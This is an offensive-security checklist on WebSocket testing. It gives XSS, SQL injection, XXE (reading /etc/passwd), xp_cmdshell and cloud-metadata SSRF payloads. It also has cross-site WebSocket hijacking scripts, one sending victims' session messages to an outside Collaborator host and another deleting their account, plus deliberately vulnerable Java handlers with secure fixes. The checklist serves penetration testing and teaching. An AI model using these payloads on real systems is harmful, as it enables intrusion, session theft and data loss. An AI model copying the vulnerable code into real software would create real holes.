tactic: Multiple

**WebSockets** are persistent, full-duplex communication tunnels between browser and server, initiated over HTTP via an upgrade handshake. Unlike HTTP, messages flow both ways continuously without new requests. Vulnerabilities arise because many developers apply less scrutiny to WebSocket messages than HTTP requests, yet the same classic vulns apply.

```
1. Browser sends HTTP upgrade request:
   GET /chat HTTP/1.1
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: base64key==

2. Server responds with 101 Switching Protocols

3. Persistent two-way tunnel open — messages flow freely in both directions
```
## Checklist

### Recon

- [ ]  Open Burp, go to Proxy → WebSockets history — inspect all messages sent and received
- [ ]  Note the message format (JSON, plain text, XML) and what fields are present
- [ ]  Check the handshake request for CSRF tokens — if missing, test for cross-site WebSocket hijacking
- [ ]  Check what HTTP headers the handshake trusts for security decisions:

```
	X-Forwarded-For
	X-Real-IP
	Origin
	Custom auth headers
```

### XSS via WebSocket

- [ ]  Inject XSS payloads into any message field that gets reflected in the UI:

```
	<img src=1 onerror='alert(1)'>
```

- [ ]  If basic event handlers are filtered, try case variation:

```
	<img src=1 oNeRrOr=alert`1`>
```

- [ ]  Check if message content is rendered as HTML anywhere in the app — chat messages, notifications, live feeds

### Classic Injection via WebSocket Messages

- [ ]  Test every field in the message payload for SQLi, XSS, XXE, command injection:

```json
	{"message":"' OR '1'='1"}
	{"query":"<img src=x onerror=alert(1)>"}
	{"data":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}
```

- [ ]  Test for blind vulns using Burp Collaborator — inject OASTIFY into any field processed server-side:
```json
	{"url":"http://OASTIFY.COM"}
	{"query":"1; exec xp_cmdshell('nslookup OASTIFY.COM')"}
```

### Handshake Vulnerabilities

- [ ]  Check if the handshake uses `X-Forwarded-For` for IP-based access control — spoof it:

```
	X-Forwarded-For: 127.0.0.1
```

- [ ]  Check if session tokens in the handshake are properly validated
- [ ]  Check for custom headers used for authentication — try removing or tampering with them
- [ ]  Check if the `Origin` header is validated — if not, cross-site connections are possible

### Cross-Site WebSocket Hijacking (CSWSH)

- [ ]  Confirm no CSRF token is present in the WebSocket handshake request
- [ ]  Verify the `Origin` header is not validated by the server
- [ ]  Host this payload on your exploit server and deliver to victim:


```html
	<script>
	    var ws = new WebSocket('wss://TARGET.net/chat');
	    ws.onopen = function() {
	        ws.send("READY");
	    };
	    ws.onmessage = function(event) {
	        fetch('https://OASTIFY.COM', {
	            method: 'POST',
	            mode: 'no-cors',
	            body: event.data
	        });
	    };
	</script>
```

- [ ]  Check Collaborator for incoming POST requests containing the victim's session data
- [ ]  Since the connection is established in the victim's browser context, the victim's cookies are sent automatically with the handshake — the server handles the connection as the victim's session

---

## Attack Payloads

**Basic XSS via WebSocket message:**

```
<img src=1 onerror='alert(1)'>
```

**XSS with filter bypass:**

```
<img src=1 oNeRrOr=alert`1`>
```

**CSWSH — steal session data via victim's WebSocket connection:**

```html
<script>
    var ws = new WebSocket('wss://TARGET.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**CSWSH — perform unauthorized action as victim:**

```html
<script>
    var ws = new WebSocket('wss://TARGET.net/chat');
    ws.onopen = function() {
        ws.send(JSON.stringify({"action":"deleteAccount","confirm":true}));
    };
</script>
```

**Inject into message to trigger server-side SSRF:**


```json
{"type":"fetch","url":"http://169.254.169.254/latest/meta-data/"}
```

---

## White Box Testing

**Vulnerable, WebSocket message content reflected into HTML without sanitization:**

```java
@Component
public class ChatWebSocketHandler extends TextWebSocketHandler {
    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        String payload = message.getPayload();

        // message broadcast directly to all connected clients without sanitization
        // attacker sends <img src=1 onerror=alert(1)> → stored XSS for all users
        broadcastToAll(new TextMessage(payload));
    }
}
```

**Vulnerable, handshake trusts X-Forwarded-For for access control:**

```java
@Component
public class WebSocketHandshakeInterceptor implements HandshakeInterceptor {
    @Override
    public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                    WebSocketHandler wsHandler, Map<String, Object> attributes) {
        HttpServletRequest servletRequest = ((ServletServerHttpRequest) request).getServletRequest();

        // trusts attacker-controlled header for IP-based access control
        String ip = servletRequest.getHeader("X-Forwarded-For");
        if (!isAllowedIp(ip)) {
            return false;
        }
        return true;
    }
}
```

**Vulnerable, no Origin validation — allows cross-site WebSocket hijacking:**

```java
@Configuration
public class WebSocketConfig implements WebSocketConfigurer {
    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(chatHandler(), "/chat")
                .setAllowedOrigins("*"); // allows connections from any origin
    }
}
```

**Vulnerable, message payload passed directly to SQL query:**

```java
@Override
protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
    JSONObject data = new JSONObject(message.getPayload());
    String username = data.getString("username");

    // username from WebSocket message concatenated into SQL
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    List<User> users = jdbcTemplate.query(query, new UserRowMapper());
    session.sendMessage(new TextMessage(users.toString()));
}
```

**Secure:**

```java
// Sanitize message content before broadcasting
@Override
protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
    String payload = message.getPayload();

    // sanitize with OWASP HTML Sanitizer before broadcasting
    PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
    String safePayload = policy.sanitize(payload);

    broadcastToAll(new TextMessage(safePayload));
}

// Validate Origin strictly — never use wildcard for authenticated WebSockets
@Configuration
public class WebSocketConfig implements WebSocketConfigurer {
    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(chatHandler(), "/chat")
                .setAllowedOrigins("https://trusted.example.com"); // explicit origin only
    }
}

// Use server-side session for identity — never trust message payload for auth context
@Override
public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                WebSocketHandler wsHandler, Map<String, Object> attributes) {
    HttpServletRequest servletRequest = ((ServletServerHttpRequest) request).getServletRequest();
    HttpSession httpSession = servletRequest.getSession(false);

    if (httpSession == null || httpSession.getAttribute("user") == null) {
        return false; // reject unauthenticated handshakes
    }
    attributes.put("user", httpSession.getAttribute("user")); // pass identity securely
    return true;
}

// Parameterised query for any DB interaction triggered by WebSocket messages
String query = "SELECT * FROM users WHERE username = ?";
List<User> users = jdbcTemplate.query(query, new UserRowMapper(), username);
```

---

## Resources

- [PortSwigger WebSockets Security](https://portswigger.net/web-security/websockets)
- [HackTricks WebSockets](https://book.hacktricks.xyz/pentesting-web/websockets-security)
- [OWASP WebSocket Security](https://owasp.org/www-community/attacks/Cross_Site_WebSocket_Hijacking)